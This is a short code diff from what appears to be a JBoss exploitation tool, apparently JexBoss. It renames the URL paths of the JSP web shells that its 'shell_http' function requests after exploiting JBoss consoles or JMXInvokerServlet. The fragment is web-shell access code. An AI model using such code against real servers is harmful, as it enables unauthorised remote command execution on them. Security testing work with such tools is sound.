@@ -237,9 +237,9 @@ def shell_http(url, shell_type):
         headers['check-updates'] = 'false'
 
     if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
-        path = '/jexws/jexws.jsp?'
+        path = '/jexws3/jexws3.jsp?'
     elif shell_type == "JMXInvokerServlet":
-        path = '/jexinv/jexinv.jsp?'
+        path = '/jexinv3/jexinv3.jsp?'
 
     pool.request('GET', url+ path, redirect=False, headers=headers)
 
